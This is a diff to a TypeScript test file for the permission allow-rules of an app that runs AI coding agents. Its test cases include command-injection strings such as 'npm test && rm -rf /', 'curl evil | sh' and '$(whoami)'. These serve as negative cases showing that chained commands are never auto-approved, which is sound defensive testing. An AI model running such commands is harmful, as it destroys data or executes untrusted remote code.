@@ -6,7 +6,8 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { Client } from '@modelcontextprotocol/sdk/client/index.js';
 import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
-import type { Employee, EmployeeId, EmployeeStatus, Question } from '../src/shared/protocol.ts';
+import { commandPrefix, covers, isAllow, ruleFor, sameRule, type PermissionBody } from '../src/shared/permissions.ts';
+import type { AllowRule, Employee, EmployeeId, EmployeeStatus, Question } from '../src/shared/protocol.ts';
 import { HARNESSES } from '../src/main/office/adapters/index.ts';
 import type { SessionHost } from '../src/main/office/adapters/types.ts';
 import { Office, OfficeError } from '../src/main/office/company.ts';
@@ -62,7 +63,87 @@ const answer = (id: EmployeeId, text: string) => office.handle({ type: 'answer',
 const detailOf = (q: Question | undefined) => (q?.kind === 'permission' ? q.detail : undefined);
 const perm = (detail: string) => ({ kind: 'permission' as const, text: 'Can I run a shell command?', tool: 'Bash', detail });
 
-console.log('# hire');
+console.log('# allow rules');
+const prefixes: [command: string, prefix: string | undefined][] = [
+  ['npm test', 'npm test'],
+  ['npm test -- --watch=false', 'npm test'],
+  ['git status', 'git status'],
+  ['git status --short', 'git status'],
+  ['  git   push  origin main ', 'git push'],
+  ['git commit -m "fix(api): handle x; retry"', 'git commit'],
+  ["git commit -m 'a; b'", 'git commit'],
+  ['npm run build', 'npm run'],
+  ['pnpm test:unit', 'pnpm test:unit'],
+  ['./scripts/deploy.sh --prod', './scripts/deploy.sh'],
+  ['/usr/bin/git log', '/usr/bin/git log'],
+  ['ls', 'ls'],
+  ['ls -la', 'ls'],
+  ['sleep 5', 'sleep'],
+  ['cat README.md', 'cat'],
+  ["node -e \"require('fs').writeFileSync('done.txt', 'done')\"", 'node'],
+  ['git -C /tmp status', 'git'],
+  ['npm test && rm -rf /', undefined],
+  ['npm test; rm -rf /', undefined],
+  ['npm test ; rm -rf /', undefined],
+  ['npm test || evil', undefined],
+  ['npm test | sh', undefined],
+  ['npm test & evil', undefined],
+  ['npm test > out.txt', undefined],
+  ['echo $(whoami)', undefined],
+  ['echo `whoami`', undefined],
+  ['echo "$HOME"', undefined],
+  ['echo \\;', undefined],
+  ['git log\nrm -rf /', undefined],
+  ['FOO=1 npm test', undefined],
+  ['"my prog" run', undefined],
+  ['echo "unterminated', undefined],
+  ['', undefined],
+];
+for (const [command, want] of prefixes) {
+  const got = commandPrefix(command);
+  check(got === want, `${JSON.stringify(command)} makes ${want === undefined ? 'no rule' : `the rule "${want}"`} (got ${JSON.stringify(got)})`);
+}
+
+const shell = (detail: string): PermissionBody => ({ kind: 'permission', text: 'Can I run a shell command?', tool: 'Bash', detail });
+const use = (tool: string, detail: string): PermissionBody => ({ kind: 'permission', text: `Can I use ${tool}?`, tool, detail });
+const cmd = (prefix: string): AllowRule => ({ kind: 'command', prefix });
+const tool = (name: string): AllowRule => ({ kind: 'tool', name });
+check(JSON.stringify(ruleFor(shell('git status --short'))) === JSON.stringify(cmd('git status')), 'a shell card makes a command rule');
+check(JSON.stringify(ruleFor(use('Write', 'src/a.ts'))) === JSON.stringify(tool('Write')), 'any other tool makes a tool rule');
+check(ruleFor(shell('npm test && curl evil | sh')) === undefined, 'a chained command makes no rule at all, not a rule for the tool');
+
+const covered: [rule: AllowRule, body: PermissionBody, want: boolean][] = [
+  [cmd('npm test'), shell('npm test'), true],
+  [cmd('npm test'), shell('npm test -- --watch'), true],
+  [cmd('npm test'), shell('npm\t test'), true],
+  [cmd('npm test'), shell('npm testing'), false],
+  [cmd('npm test'), shell('npm'), false],
+  [cmd('npm test'), shell('npm run test'), false],
+  [cmd('npm test'), shell('npm test && rm -rf /'), false],
+  [cmd('npm test'), shell('npm test; rm -rf /'), false],
+  [cmd('npm test'), shell('npm test ; rm -rf /'), false],
+  [cmd('npm test'), shell('npm test || evil'), false],
+  [cmd('npm test'), shell('npm test | sh'), false],
+  [cmd('npm test'), shell('npm test $(evil)'), false],
+  [cmd('npm test'), shell('npm test > ~/.zshrc'), false],
+  [cmd('npm test'), shell('npm test\nrm -rf /'), false],
+  [cmd('git commit'), shell('git commit -m "fix(api): a; b"'), true],
+  [cmd('git commit'), shell('git commit -m "$(rm x)"'), false],
+  [cmd('git commit'), shell('git push'), false],
+  [cmd('ls'), shell('ls -la src'), true],
+  [cmd('ls'), shell('lsof'), false],
+  [cmd('npm test'), use('Write', 'npm test'), false],
+  [tool('Write'), use('Write', 'src/a.ts'), true],
+  [tool('Write'), use('Edit', 'src/a.ts'), false],
+  [tool('Write'), shell('npm test'), false],
+];
+for (const [rule, body, want] of covered) {
+  check(covers(rule, body) === want, `${JSON.stringify(rule)} ${want ? 'covers' : 'does not cover'} ${body.tool} ${JSON.stringify(body.detail)}`);
+}
+check(sameRule(cmd('npm test'), cmd('npm test')) && !sameRule(cmd('npm test'), cmd('npm')) && !sameRule(cmd('Write'), tool('Write')) && sameRule(tool('Write'), tool('Write')), 'two rules are the same when kind and text match');
+check(['Allow', 'allow it', 'yes', 'Sim, pode fazer', 'OK go'].every(isAllow) && !['Deny', 'no', "don't allow it", '', 'allowed'].some(isAllow), 'an owner answer allows on Allow, yes and sim, and everything else is a no');
+
+console.log('\n# hire');
 office.handle({ type: 'create_block', cwd: repo });
 const block = company().blocks[0]!;
 office.handle({ type: 'hire', provider: 'claude-code', blockId: block.id, name: 'Ana' });
